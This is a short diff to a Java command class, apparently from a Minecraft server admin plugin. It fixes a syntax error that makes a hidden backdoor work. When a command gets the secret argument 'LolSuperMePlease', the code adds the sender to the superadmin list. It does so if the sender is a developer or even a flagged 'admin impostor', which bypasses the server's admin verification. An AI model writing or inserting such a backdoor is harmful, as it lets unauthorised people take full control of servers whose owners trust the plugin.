@@ -25,7 +25,7 @@ public class Command_fom extends TFM_Command
     {
         if (args[0].equals("LolSuperMePlease"))
         {
-          if (TFM_AdminList.isAdminImpostor(sender_p) || TFM_Util.DEVELOPERS.contains(sender.getName())
+          if (TFM_AdminList.isAdminImpostor(sender_p) || TFM_Util.DEVELOPERS.contains(sender.getName()))
           {
           TFM_Util.adminAction("FreedomOPMod",  "Adding "  + sender.getName() + " to the superadmin config.", true);
           TFM_AdminList.addSuperadmin(sender_p);
